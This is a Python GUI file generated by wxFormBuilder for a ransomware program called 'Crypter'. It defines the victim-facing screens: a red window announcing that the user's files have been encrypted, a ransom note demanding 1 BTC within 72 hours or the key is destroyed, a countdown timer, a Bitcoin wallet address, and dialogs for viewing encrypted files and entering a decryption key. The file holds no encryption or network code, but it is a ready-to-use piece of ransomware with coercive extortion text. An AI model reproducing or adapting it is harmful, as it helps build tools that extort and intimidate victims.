# -*- coding: utf-8 -*- 

###########################################################################
## Python code generated with wxFormBuilder (version Jun 17 2015)
## http://www.wxformbuilder.org/
##
## PLEASE DO "NOT" EDIT THIS FILE!
###########################################################################

import wx
import wx.xrc

###########################################################################
## Class MainFrame
###########################################################################

class MainFrame ( wx.Frame ):
	
	def __init__( self, parent ):
		wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = u"Crypter", pos = wx.DefaultPosition, size = wx.Size( -1,-1 ), style = wx.CAPTION|wx.CLOSE_BOX|wx.MINIMIZE_BOX|wx.SYSTEM_MENU|wx.TAB_TRAVERSAL )
		
		self.SetSizeHintsSz( wx.DefaultSize, wx.Size( -1,-1 ) )
		self.SetBackgroundColour( wx.Colour( 177, 7, 14 ) )
		
		MainSizer = wx.BoxSizer( wx.VERTICAL )
		
		MainSizer.SetMinSize( wx.Size( 1000,750 ) ) 
		self.HeaderPanel = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		HeaderSizer = wx.BoxSizer( wx.VERTICAL )
		
		self.CrypterTitleBitmap = wx.StaticBitmap( self.HeaderPanel, wx.ID_ANY, wx.NullBitmap, wx.DefaultPosition, wx.DefaultSize, 0 )
		HeaderSizer.Add( self.CrypterTitleBitmap, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 10 )
		
		self.FlashingMessageText = wx.StaticText( self.HeaderPanel, wx.ID_ANY, u"YOUR FILES HAVE BEEN ENCRYPTED!", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.FlashingMessageText.Wrap( -1 )
		self.FlashingMessageText.SetFont( wx.Font( 18, 75, 90, 92, False, "Courier New" ) )
		self.FlashingMessageText.SetForegroundColour( wx.Colour( 255, 255, 0 ) )
		
		HeaderSizer.Add( self.FlashingMessageText, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 10 )
		
		
		self.HeaderPanel.SetSizer( HeaderSizer )
		self.HeaderPanel.Layout()
		HeaderSizer.Fit( self.HeaderPanel )
		MainSizer.Add( self.HeaderPanel, 0, wx.EXPAND |wx.ALL, 20 )
		
		self.BodyPanel = wx.Panel( self, wx.ID_ANY, wx.Point( -1,-1 ), wx.DefaultSize, wx.TAB_TRAVERSAL )
		BodySizer = wx.BoxSizer( wx.HORIZONTAL )
		
		self.LockBitmap = wx.StaticBitmap( self.BodyPanel, wx.ID_ANY, wx.NullBitmap, wx.Point( -1,-1 ), wx.DefaultSize, 0 )
		BodySizer.Add( self.LockBitmap, 3, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 7 )
		
		self.RansomNoteText = wx.TextCtrl( self.BodyPanel, wx.ID_ANY, u"The important files on your computer have been encrypted with military grade AES-256 bit encryption.\n\nYour documents, videos, images and other forms of data are now inaccessible, and cannot be unlocked without the decryption key. This key is currently being stored on a remote server.\n\nTo acquire this key, transfer a total of 1 BTC to the Bitcoin wallet address below within 72 hours.\n\nIf you fail to take action within this time window, the decryption key will be destoyed and access to your files will be permanently lost.", wx.DefaultPosition, wx.DefaultSize, wx.TE_MULTILINE|wx.TE_NO_VSCROLL|wx.TE_READONLY )
		self.RansomNoteText.SetFont( wx.Font( 14, 75, 90, 90, False, "Courier New" ) )
		
		BodySizer.Add( self.RansomNoteText, 7, wx.ALL|wx.EXPAND, 10 )
		
		
		self.BodyPanel.SetSizer( BodySizer )
		self.BodyPanel.Layout()
		BodySizer.Fit( self.BodyPanel )
		MainSizer.Add( self.BodyPanel, 2, wx.ALL|wx.EXPAND, 20 )
		
		self.FooterPanel = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		FooterSizer = wx.BoxSizer( wx.VERTICAL )
		
		bSizer20 = wx.BoxSizer( wx.HORIZONTAL )
		
		
		bSizer20.AddSpacer( ( 0, 0), 2, wx.EXPAND, 5 )
		
		self.KeyDestructionLabel = wx.StaticText( self.FooterPanel, wx.ID_ANY, u"KEY DESTRUCTION IN:", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.KeyDestructionLabel.Wrap( -1 )
		self.KeyDestructionLabel.SetFont( wx.Font( 16, 75, 90, 92, False, "Courier New" ) )
		self.KeyDestructionLabel.SetForegroundColour( wx.Colour( 255, 255, 0 ) )
		
		bSizer20.Add( self.KeyDestructionLabel, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )
		
		self.KeyDestructionTime = wx.StaticText( self.FooterPanel, wx.ID_ANY, u"00:00:00", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.KeyDestructionTime.Wrap( -1 )
		self.KeyDestructionTime.SetFont( wx.Font( 16, 75, 90, 92, True, "Courier New" ) )
		self.KeyDestructionTime.SetForegroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_BTNHIGHLIGHT ) )
		
		bSizer20.Add( self.KeyDestructionTime, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )
		
		
		bSizer20.AddSpacer( ( 0, 0), 2, wx.EXPAND, 5 )
		
		
		FooterSizer.Add( bSizer20, 1, wx.EXPAND, 5 )
		
		bSizer21 = wx.BoxSizer( wx.HORIZONTAL )
		
		
		bSizer21.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
		
		self.WalletAddressLabel = wx.StaticText( self.FooterPanel, wx.ID_ANY, u"WALLET ADDRESS:", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.WalletAddressLabel.Wrap( -1 )
		self.WalletAddressLabel.SetFont( wx.Font( 16, 75, 90, 92, False, "Courier New" ) )
		self.WalletAddressLabel.SetForegroundColour( wx.Colour( 255, 255, 0 ) )
		
		bSizer21.Add( self.WalletAddressLabel, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )
		
		self.WalletAddressString = wx.StaticText( self.FooterPanel, wx.ID_ANY, u"1BoatSLRHtKNngkdXEeobR76b53LETtpyT", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.WalletAddressString.Wrap( -1 )
		self.WalletAddressString.SetFont( wx.Font( 16, 75, 90, 92, True, "Courier New" ) )
		self.WalletAddressString.SetForegroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_BTNHIGHLIGHT ) )
		
		bSizer21.Add( self.WalletAddressString, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )
		
		
		bSizer21.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
		
		
		FooterSizer.Add( bSizer21, 1, wx.EXPAND, 5 )
		
		bSizer211 = wx.BoxSizer( wx.HORIZONTAL )
		
		self.ViewEncryptedFilesButton = wx.Button( self.FooterPanel, wx.ID_ANY, u"View Encrypted Files", wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer211.Add( self.ViewEncryptedFilesButton, 0, wx.ALL|wx.EXPAND, 5 )
		
		
		bSizer211.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
		
		self.EnterDecryptionKeyButton = wx.Button( self.FooterPanel, wx.ID_ANY, u"Enter Decryption Key", wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer211.Add( self.EnterDecryptionKeyButton, 0, wx.ALL|wx.EXPAND, 5 )
		
		
		FooterSizer.Add( bSizer211, 1, wx.EXPAND, 0 )
		
		
		self.FooterPanel.SetSizer( FooterSizer )
		self.FooterPanel.Layout()
		FooterSizer.Fit( self.FooterPanel )
		MainSizer.Add( self.FooterPanel, 1, wx.ALL|wx.EXPAND, 5 )
		
		
		self.SetSizer( MainSizer )
		self.Layout()
		MainSizer.Fit( self )
		
		self.Centre( wx.BOTH )
	
	def __del__( self ):
		pass
	

###########################################################################
## Class ViewEncryptedFilesDialog
###########################################################################

class ViewEncryptedFilesDialog ( wx.Frame ):
	
	def __init__( self, parent ):
		wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = u"Encrypted Files", pos = wx.DefaultPosition, size = wx.Size( 600,400 ), style = wx.DEFAULT_FRAME_STYLE|wx.TAB_TRAVERSAL )
		
		self.SetSizeHintsSz( wx.DefaultSize, wx.DefaultSize )
		
		BodySizer = wx.BoxSizer( wx.VERTICAL )
		
		self.m_panel4 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		TextCtrlSizer = wx.BoxSizer( wx.VERTICAL )
		
		self.EncryptedFilesTextCtrl = wx.TextCtrl( self.m_panel4, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, wx.TE_DONTWRAP|wx.TE_MULTILINE|wx.TE_READONLY )
		TextCtrlSizer.Add( self.EncryptedFilesTextCtrl, 1, wx.ALL|wx.EXPAND, 5 )
		
		
		self.m_panel4.SetSizer( TextCtrlSizer )
		self.m_panel4.Layout()
		TextCtrlSizer.Fit( self.m_panel4 )
		BodySizer.Add( self.m_panel4, 1, wx.EXPAND |wx.ALL, 5 )
		
		
		self.SetSizer( BodySizer )
		self.Layout()
		
		self.Centre( wx.BOTH )
	
	def __del__( self ):
		pass
	

###########################################################################
## Class EnterDecryptionKeyDialog
###########################################################################

class EnterDecryptionKeyDialog ( wx.Dialog ):
	
	def __init__( self, parent ):
		wx.Dialog.__init__ ( self, parent, id = wx.ID_ANY, title = u"Decrypt Files", pos = wx.DefaultPosition, size = wx.Size( 500,200 ), style = wx.DEFAULT_DIALOG_STYLE )
		
		self.SetSizeHintsSz( wx.DefaultSize, wx.DefaultSize )
		
		bSizer12 = wx.BoxSizer( wx.VERTICAL )
		
		self.m_panel6 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		MainSizer = wx.StaticBoxSizer( wx.StaticBox( self.m_panel6, wx.ID_ANY, u"AES Decryption Key" ), wx.VERTICAL )
		
		
		MainSizer.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
		
		
		MainSizer.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
		
		bSizer13 = wx.BoxSizer( wx.HORIZONTAL )
		
		
		bSizer13.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
		
		self.DecryptionKeyTextCtrl = wx.TextCtrl( MainSizer.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.Size( 220,-1 ), 0 )
		self.DecryptionKeyTextCtrl.SetMaxLength( 32 ) 
		bSizer13.Add( self.DecryptionKeyTextCtrl, 0, wx.ALL, 5 )
		
		
		bSizer13.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
		
		
		MainSizer.Add( bSizer13, 1, wx.EXPAND, 5 )
		
		
		MainSizer.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
		
		OkCancelSizer = wx.StdDialogButtonSizer()
		self.OkCancelSizerOK = wx.Button( MainSizer.GetStaticBox(), wx.ID_OK )
		OkCancelSizer.AddButton( self.OkCancelSizerOK )
		self.OkCancelSizerCancel = wx.Button( MainSizer.GetStaticBox(), wx.ID_CANCEL )
		OkCancelSizer.AddButton( self.OkCancelSizerCancel )
		OkCancelSizer.Realize();
		
		MainSizer.Add( OkCancelSizer, 1, wx.EXPAND, 5 )
		
		self.StatusText = wx.StaticText( MainSizer.GetStaticBox(), wx.ID_ANY, u"Waiting for input", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.StatusText.Wrap( -1 )
		MainSizer.Add( self.StatusText, 0, wx.ALL, 5 )
		
		self.DecryptionGauge = wx.Gauge( MainSizer.GetStaticBox(), wx.ID_ANY, 100, wx.DefaultPosition, wx.DefaultSize, wx.GA_HORIZONTAL )
		self.DecryptionGauge.SetValue( 0 ) 
		MainSizer.Add( self.DecryptionGauge, 0, wx.ALL, 5 )
		
		
		self.m_panel6.SetSizer( MainSizer )
		self.m_panel6.Layout()
		MainSizer.Fit( self.m_panel6 )
		bSizer12.Add( self.m_panel6, 1, wx.EXPAND |wx.ALL, 5 )
		
		
		self.SetSizer( bSizer12 )
		self.Layout()
		
		self.Centre( wx.BOTH )
	
	def __del__( self ):
		pass
	

